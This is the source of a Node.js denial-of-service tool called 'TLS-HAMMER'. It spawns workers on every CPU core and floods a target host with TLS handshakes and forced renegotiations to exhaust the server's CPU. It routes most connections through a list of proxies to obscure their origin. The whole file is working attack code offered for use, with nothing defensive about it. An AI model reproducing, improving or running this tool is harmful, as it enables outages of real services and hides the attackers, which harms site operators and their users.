// R10-3: TLS-HAMMER - SSL/TLS Handshake Exhaustion
// Focus: CPU burn on target (low local CPU)
// Technique: Rapid TLS renegotiation + Session resumption
// Updated: Mixed main IP + proxies

const tls = require('tls');
const net = require('net');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');

const CPU_CORES = os.cpus().length;
let proxies = [];

// Load proxies
try {
    proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#') && line.includes(':'));
    console.log(`[R10-3] Loaded ${proxies.length} proxies`);
} catch (e) {
    console.log('[R10-3] No proxy.txt found, running with main IP only');
}

// Mix settings
const USE_MAIN_IP = true;
const MIX_RATIO = 0.3; // 30% main IP

if (cluster.isMaster) {
    console.log(`[R10-3] TLS-HAMMER launching on ${CPU_CORES} cores`);
    console.log(`[R10-3] Mode: ${USE_MAIN_IP ? 'MIXED' : 'PROXY-ONLY'} (${MIX_RATIO*100}% main IP)`);
    for (let i = 0; i < CPU_CORES; i++) cluster.fork();
    
    setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
} else {
    const target = process.argv[2];
    const time = process.argv[3] || 300;
    startTLSHammer(target, time);
}

function shouldUseMainIp() {
    return USE_MAIN_IP && Math.random() < MIX_RATIO;
}

function startTLSHammer(target, time) {
    const parsed = new URL(target);
    let handshakes = 0;
    let mainIpCount = 0;
    let proxyCount = 0;
    
    const interval = setInterval(() => {
        for (let i = 0; i < 100; i++) {
            try {
                const useMain = shouldUseMainIp();
                
                if (!useMain && proxies.length > 0) {
                    // Use proxy
                    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                    const [proxyHost, proxyPort] = proxy.split(':');
                    
                    const socket = net.connect(parseInt(proxyPort), proxyHost, () => {
                        socket.write(`CONNECT ${parsed.hostname}:443 HTTP/1.1\r\nHost: ${parsed.hostname}:443\r\n\r\n`);
                        
                        socket.once('data', () => {
                            const tlsSocket = tls.connect({
                                socket: socket,
                                servername: parsed.hostname,
                                rejectUnauthorized: false,
                                ciphers: 'AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
                                secureProtocol: 'TLSv1_2_method'
                            });
                            
                            tlsSocket.on('secureConnect', () => {
                                handshakes++;
                                proxyCount++;
                                
                                // Immediate renegotiation - CPU heavy on target
                                if (Math.random() > 0.5) {
                                    tlsSocket.renegotiate({}, (err) => {});
                                }
                                
                                setTimeout(() => tlsSocket.destroy(), 100);
                            });
                            
                            tlsSocket.on('error', () => {});
                        });
                    });
                    
                    socket.on('error', () => {});
                } else {
                    // Direct connection (main IP)
                    const tlsSocket = tls.connect(443, parsed.hostname, {
                        rejectUnauthorized: false,
                        servername: parsed.hostname,
                        ciphers: 'AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
                        secureProtocol: 'TLSv1_2_method'
                    }, () => {
                        handshakes++;
                        mainIpCount++;
                        
                        if (Math.random() > 0.5) {
                            tlsSocket.renegotiate({}, (err) => {});
                        }
                        
                        setTimeout(() => tlsSocket.destroy(), 100);
                    });
                    
                    tlsSocket.on('error', () => {});
                }
            } catch (e) {}
        }
    }, 50);
    
    setInterval(() => {
        console.log(`[R10-3] Handshakes/sec: ${handshakes} | Main IP: ${mainIpCount} | Proxy: ${proxyCount}`);
        handshakes = 0;
        mainIpCount = 0;
        proxyCount = 0;
    }, 1000);
    
    setTimeout(() => {
        clearInterval(interval);
        process.exit(0);
    }, time * 1000);
}